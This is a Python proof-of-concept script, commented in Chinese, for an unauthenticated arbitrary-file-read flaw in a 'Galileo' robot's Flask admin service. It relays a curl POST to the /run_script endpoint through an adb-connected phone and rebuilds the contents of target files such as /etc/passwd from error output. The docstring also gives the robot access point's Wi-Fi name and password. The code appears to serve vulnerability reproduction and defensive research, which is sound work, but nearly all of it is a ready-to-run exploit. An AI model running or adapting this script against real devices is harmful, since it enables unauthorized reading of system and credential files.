#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
伽利略（Galileo）机器人 任意文件读取漏洞 一键复现脚本

漏洞：Flask 管理后台（5000 端口）未授权，/run_script 接口把任意文件当脚本执行，
执行报错时 stderr 回显文件每行内容，从而泄露任意可读文件的完整内容。

本脚本通过 adb 中转（PC → 手机 → 机器人），复现该漏洞，回显文件内容。

用法：
  python read_file.py <文件路径>
  python read_file.py /etc/passwd
  python read_file.py /etc/hostname

前置环境（一次性）：
  - 手机 USB 连接（adb 可见），且已连入机器人 AP（C1W-1.0-007 / 88888888）
  - adb 在 PATH 中

依赖：Python 3 标准库 + adb。
仅用于授权测试/防御研究。
"""
import json
import re
import subprocess
import sys

ADB = "adb"
ROBOT = "192.168.2.1"   # 机器人 AP 网关，可经手机到达


def get_device():
    """自动探测第一个在线 adb 设备。"""
    p = subprocess.run([ADB, "devices"], capture_output=True, text=True, timeout=10)
    for line in p.stdout.split("\n")[1:]:
        if "\tdevice" in line:
            return line.split("\t")[0]
    return None


def read_file_via_run_script(device: str, path: str):
    """经 /run_script 漏洞读取文件，返回 (内容, 原始响应)。"""
    body = json.dumps({"script": path, "args": ""})
    # 手机 sh 执行 curl；body 用单引号包裹（JSON 内部双引号）
    curl = f"curl -s -X POST http://{ROBOT}:5000/run_script -H 'Content-Type: application/json' -d '{body}'"
    p = subprocess.run(
        [ADB, "-s", device, "shell", curl],
        capture_output=True, text=True, timeout=30,
    )
    try:
        data = json.loads(p.stdout)
    except Exception:
        return "", {"message": f"响应解析失败: {p.stdout[:200]}", "status": "error"}

    # 后端 sh 逐行执行文件，解析失败的行在 stderr 回显 "<行内容>: not found"
    stderr = data.get("stderr", "")
    lines = []
    for line in stderr.split("\n"):
        m = re.match(r"^[^:]+: \d+: (.*): not found$", line)
        if m:
            lines.append(m.group(1))
    return "\n".join(lines), data


def main():
    if len(sys.argv) < 2:
        print("用法: python read_file.py <文件路径>")
        print("示例: python read_file.py /etc/passwd")
        sys.exit(1)

    path = sys.argv[1]
    print("=" * 60)
    print(f" 任意文件读取漏洞复现：{path}")
    print("=" * 60)

    device = get_device()
    if not device:
        print("[-] 未找到在线 adb 设备，请确认手机已通过 USB 连接")
        sys.exit(1)
    print(f"[*] adb 设备: {device}")
    print(f"[*] 经 /run_script 未授权接口读取（sh 执行报错回显）...")
    print()

    content, data = read_file_via_run_script(device, path)

    if not content:
        msg = data.get("message", "")
        if "not found" in msg and data.get("status") == "error":
            print(f"[-] 文件不存在或不可读: {msg}")
        else:
            print(f"[-] 读取失败: {msg}")
        sys.exit(1)

    print("-" * 60)
    print(content)
    print("-" * 60)
    print(f"[+] 成功读取 {len(content)} 字符")


if __name__ == "__main__":
    main()
